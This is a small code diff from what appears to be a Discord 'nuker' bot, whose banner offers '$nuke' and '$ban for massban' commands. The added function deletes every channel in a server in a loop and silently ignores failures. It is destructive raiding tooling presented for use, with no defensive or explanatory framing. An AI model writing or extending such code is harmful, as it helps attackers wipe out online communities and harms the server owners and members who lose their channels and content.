@@ -38,5 +38,13 @@ print(f"""
 """)
 print(f"{pink}>{red} $nuke to nuke and $ban for massban")
 
-
+async def delete_all_channel(guild):
+    deleted = 0
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            deleted += 1
+        except:
+            continue
+    return deleted
 
